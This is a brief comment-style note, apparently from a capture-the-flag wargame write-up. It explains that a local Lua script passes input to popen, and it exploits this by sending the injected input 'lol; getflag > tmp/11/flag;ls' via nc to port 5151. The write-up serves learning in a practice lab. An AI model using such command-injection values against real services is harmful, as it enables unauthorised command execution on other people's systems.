# We started to search for the right hash but it s
# wrong path.
# In the Lua script there a popen that execute a command shell
# first nc 127.0.0.1 5151 
# then type "lol; getflag > tmp/11/flag;ls"
# dont forget to chmod 777 /tmp/10